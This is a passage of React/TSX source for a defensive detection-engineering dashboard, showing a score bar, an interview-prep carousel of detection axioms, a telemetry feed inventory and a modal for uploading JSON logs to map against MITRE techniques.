                              className={`h-2 rounded-full ${report.score >= 5 ? 'bg-emerald-500 shadow-sm shadow-emerald-500/30' : report.score === 4 ? 'bg-cyan-500 shadow-sm shadow-cyan-500/30' : report.score === 3 ? 'bg-blue-500' : report.score === 2 ? 'bg-amber-500' : 'bg-rose-500'}`} 
                              style={{ width: `${(report.score / 6) * 100}%` }}
                            />
                          </div>
                          <span className="text-xs font-mono font-bold text-white shrink-0">{report.score}/6</span>
                        </div>
                      </div>

                      <div className="text-[0.68rem] text-slate-400 leading-normal bg-black/20 p-3 rounded-xl border border-slate-800/50">
                        <strong>Analysis:</strong> Focus detection logic above Level 3 to trigger high attacker cost. Chasing hashes/IPs creates excessive alarms and minor security benefit.
                      </div>
                    </div>
                  </div>

                  {/* Operational Axioms Carousel */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 backdrop-blur-xl flex flex-col gap-5 relative overflow-hidden">
                    
                    <div className="absolute top-0 right-0 w-24 h-24 bg-indigo-500/5 rounded-full blur-2xl"></div>

                    <div className="flex justify-between items-center border-b border-slate-800 pb-3">
                      <div>
                        <h3 className="font-bold text-white text-sm flex items-center gap-2">
                          <span>🧠</span> Detection Engineering Operational Axioms
                        </h3>
                        <p className="text-slate-500 text-[0.68rem] mt-0.5">10 Core Hot-Takes & Philosophies for Interview Prep</p>
                      </div>
                      <span className="font-mono text-xs text-indigo-400 font-bold bg-indigo-500/10 border border-indigo-500/20 px-2 py-0.5 rounded">
                        Axiom {DE_AXIOMS[axiomIndex].number} of 10
                      </span>
                    </div>

                    {/* Active Card Body */}
                    <div className="min-h-[160px] flex flex-col justify-center gap-4 bg-slate-900/40 border border-slate-800/60 rounded-xl p-5 hover:border-slate-700/60 transition-all duration-300">
                      <div className="flex items-center gap-2">
                        <span className="text-3xl text-indigo-500/30 font-serif leading-none">“</span>
                        <h4 className="font-bold text-base text-slate-200">{DE_AXIOMS[axiomIndex].title}</h4>
                      </div>
                      <p className="text-sm font-medium italic text-slate-300 pl-4 border-l-2 border-indigo-500/50 leading-relaxed">
                        {DE_AXIOMS[axiomIndex].quote}
                      </p>
                      <p className="text-xs text-slate-400 mt-2 leading-relaxed bg-black/20 p-2.5 rounded-lg border border-slate-800/50">
                        <strong className="text-indigo-400">Insight:</strong> {DE_AXIOMS[axiomIndex].insight}
                      </p>
                    </div>

                    {/* Controls */}
                    <div className="flex justify-between items-center">
                      <div className="flex gap-1.5">
                        {DE_AXIOMS.map((_, idx) => (
                          <button
                            key={idx}
                            onClick={() => setAxiomIndex(idx)}
                            className={`h-1.5 rounded-full transition-all duration-300 ${idx === axiomIndex ? 'w-5 bg-indigo-500' : 'w-1.5 bg-slate-700 hover:bg-slate-600'}`}
                            aria-label={`Go to slide ${idx + 1}`}
                          />
                        ))}
                      </div>

                      <div className="flex gap-2">
                        <button
                          onClick={() => setAxiomIndex(prev => (prev - 1 + 10) % 10)}
                          className="bg-slate-900 border border-slate-800 hover:border-slate-700 text-slate-300 hover:text-white w-9 h-9 rounded-lg flex items-center justify-center text-sm font-bold transition-all hover:scale-[1.05] active:scale-[0.95] cursor-pointer"
                          aria-label="Previous Axiom"
                        >
                          ◀
                        </button>
                        <button
                          onClick={() => setAxiomIndex(prev => (prev + 1) % 10)}
                          className="bg-indigo-600 hover:bg-indigo-500 text-white w-9 h-9 rounded-lg flex items-center justify-center text-sm font-bold transition-all shadow-md shadow-indigo-500/20 hover:scale-[1.05] active:scale-[0.95] cursor-pointer"
                          aria-label="Next Axiom"
                        >
                          ▶
                        </button>
                      </div>
                    </div>
                  </div>

                </div>

              </div>
            </>
          );
        })()}

        {/* Active Tab: TELEMETRY INVENTORY (Tab 3) */}
        {activeTab === 'telemetry' && (
          <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6">
            <header className="border-b border-slate-800/60 pb-5 mb-6">
              <h2 className="text-xl font-bold text-white mb-1">
                📊 Telemetry Ingestion Inventory
              </h2>
              <p className="text-slate-400 text-xs">
                Inspect which telemetry feeds are actively forwarding data to the SIEM, and identify missing logging profiles.
              </p>
            </header>

            <div className="grid md:grid-cols-2 gap-6">
              {/* Enabled Feed Column */}
              <div className="bg-[#05070c]/50 border border-slate-800/60 rounded-xl p-5">
                <h3 className="text-emerald-400 font-bold text-sm mb-4 flex items-center gap-1.5">
                  <span className="w-2.5 h-2.5 rounded-full bg-emerald-500"></span>
                  Active Telemetry Sources
                </h3>
                <div className="flex flex-col gap-3">
                  {telemetryInventory.filter(t => t.status === 'enabled').map(item => (
                    <div key={item.name} className="flex justify-between items-center border-b border-slate-800/60 pb-3">
                      <div>
                        <p className="font-semibold text-xs text-slate-100">{item.name}</p>
                        <p className="text-[0.68rem] text-slate-500">{item.source}</p>
                      </div>
                      <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 text-[0.62rem] font-bold uppercase tracking-wider px-2 py-0.5 rounded">
                        Active
                      </span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Missing Feed Column */}
              <div className="bg-[#05070c]/50 border border-slate-800/60 rounded-xl p-5">
                <h3 className="text-rose-400 font-bold text-sm mb-4 flex items-center gap-1.5">
                  <span className="w-2.5 h-2.5 rounded-full bg-rose-500"></span>
                  Disabled / Missing Sources
                </h3>
                <div className="flex flex-col gap-3">
                  {telemetryInventory.filter(t => t.status === 'missing').map(item => (
                    <div key={item.name} className="flex justify-between items-center border-b border-slate-800/60 pb-3">
                      <div>
                        <p className="font-semibold text-xs text-slate-100">{item.name}</p>
                        <p className="text-[0.68rem] text-slate-500">{item.source}</p>
                      </div>
                      <span className="bg-rose-500/10 text-rose-400 border border-rose-500/20 text-[0.62rem] font-bold uppercase tracking-wider px-2 py-0.5 rounded">
                        Missing
                      </span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}

      </section>

      {/* UPLOAD CUSTOM LOGS MODAL OVERLAY */}
      {modalOpen && (
        <div className="fixed inset-0 bg-black/85 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-[#0f1322] border border-indigo-500/30 rounded-2xl max-w-xl w-full p-6 flex flex-col gap-4 shadow-2xl shadow-black/80">
            <div className="flex justify-between items-center border-b border-slate-800 pb-3">
              <h3 className="text-base font-bold text-white">Ingest Custom Logs</h3>
              <button 
                onClick={() => setModalOpen(false)}
                className="text-slate-500 hover:text-white text-xl font-bold cursor-pointer"
              >
                &times;
              </button>
            </div>

            <p className="text-xs text-slate-400 leading-relaxed">
              Upload custom JSON logs (an individual log object or a JSON array). The analyzer maps fields dynamically, links logs to the MITRE heatmap, and calculates gaps.
            </p>

            {/* Drag & Drop File Container */}
            <div 
              onDragOver={handleDragOver}
              onDrop={handleDrop}
              onClick={() => fileInputRef.current?.click()}
              className="border-2 border-dashed border-slate-800 hover:border-indigo-500/50 hover:bg-indigo-500/5 transition-all rounded-xl p-6 text-center cursor-pointer flex flex-col items-center gap-2"
            >
              <input 
                type="file" 
                ref={fileInputRef} 
                onChange={(e) => {
                  const file = e.target.files?.[0];
                  if (file) {
                    const reader = new FileReader();
                    reader.onload = (event) => {
                      if (event.target?.result) setPastedLogsText(event.target.result as string);
                    };
                    reader.readAsText(file);
                  }
                }}
                accept=".json" 
                className="hidden" 
              />
              <span className="text-2xl">📂</span>
              <span className="text-xs text-slate-300">Click to choose a JSON file or drag it here</span>
              <span className="text-[0.62rem] text-slate-500">Supports standard JSON formats</span>
            </div>

            {/* Manual Text Paste Area */}
            <div className="flex flex-col gap-1.5">
              <label htmlFor="modal-paste-area" className="text-xs font-semibold text-slate-400">Or Paste Raw JSON logs:</label>
              <textarea 
                id="modal-paste-area"
                className="w-full h-32 bg-[#05070c] border border-slate-800 rounded-lg p-3 text-cyan-400 font-mono text-xs focus:outline-none focus:border-indigo-500 resize-none"
                placeholder='[
  {
    "@timestamp": "2026-05-24T12:00:00Z",
    "event": { "action": "custom-execution" },
    "process": { "name": "whoami.exe" }
  }
]'
                value={pastedLogsText}
                onChange={(e) => setPastedLogsText(e.target.value)}
              />
              {validationError && (
                <div className="text-rose-400 font-mono text-[0.68rem] mt-1">
                  {validationError}
                </div>
              )}
            </div>

            <button 
              onClick={() => handleLogsUpload(pastedLogsText)}
              className="w-full bg-gradient-to-r from-indigo-500 to-purple-600 hover:brightness-110 text-white font-bold text-xs py-2.5 rounded-lg transition-all shadow-md shadow-indigo-500/20 cursor-pointer"
            >
              ⚡ Ingest & Map Logs
            </button>
          </div>
        </div>
      )}

    </main>
  );
}
